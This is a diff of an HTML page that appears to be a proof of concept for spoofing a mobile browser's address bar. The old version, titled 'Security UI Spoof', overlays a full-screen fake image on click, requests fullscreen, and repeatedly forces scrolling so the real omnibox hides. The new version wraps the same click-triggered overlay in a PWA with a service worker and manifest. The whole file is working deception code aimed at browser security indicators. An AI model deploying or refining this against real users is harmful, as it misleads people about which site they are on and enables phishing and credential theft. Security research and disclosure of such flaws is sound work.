@@ -1,81 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <title>Security UI Spoof</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 200vh; /* bikin page bisa scroll */
-            font-family: sans-serif;
-        }
-        #spoof {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            display: none;
-            z-index: 9999;
-            object-fit: cover;
-            pointer-events: none;
-        }
-        #content {
-            text-align: center;
-            padding-top: 140px;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>PWA UI Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link rel="manifest" href="manifest.json">
+  <meta name="theme-color" content="#000000">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      color: #fff;
+      font-family: sans-serif;
+    }
+
+    #content {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    #spoof {
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      display: none;
+      z-index: 9999;
+      pointer-events: none;
+    }
+  </style>
 </head>
+
 <body>
 
-<img id="spoof" src="spoof2.png" alt="overlay">
+<img id="spoof" src="spoof2.png" alt="spoof">
+
 <div id="content">
-    <h1>Click anywhere on the page to spoof the omnibox!</h1>
+  <h1>Tap anywhere</h1>
 </div>
 
 <script>
-const spoof = document.getElementById("spoof");
-const content = document.getElementById("content");
+  // register SW (required for install prompt stability)
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js');
+  }
 
-// Fungsi scroll ke atas (lebih “paksa”)
-function scrollTopForce() {
-    window.scrollTo(0, 0);
-    document.body.scrollTop = 0;
-    document.documentElement.scrollTop = 0;
-}
-
-// Tap anywhere → fullscreen + overlay
-document.addEventListener('click', async () => {
-    spoof.style.display = "block";
-    content.style.display = "none";
-
-    if (document.documentElement.requestFullscreen) {
-        try {
-            await document.documentElement.requestFullscreen();
-        } catch(e) {}
-    }
-
-    // Scroll langsung ke atas
-    scrollTopForce();
-}, { once: true });
-
-// Listener fullscreen change → scroll ke atas ketika keluar fullscreen
-document.addEventListener('fullscreenchange', () => {
-    if (!document.fullscreenElement) {
-        // Paksa scroll beberapa kali supaya omnibar nutup
-        let attempts = 0;
-        const interval = setInterval(() => {
-            scrollTopForce();
-            attempts++;
-            if (attempts > 10) clearInterval(interval);
-        }, 50);
-    }
-});
-
-// Resize listener → kadang toolbar Android muncul
-window.addEventListener('resize', scrollTopForce);
+  document.addEventListener('click', () => {
+    document.getElementById('spoof').style.display = 'block';
+    document.getElementById('content').style.display = 'none';
+  }, { once: true });
 </script>
 
 </body>
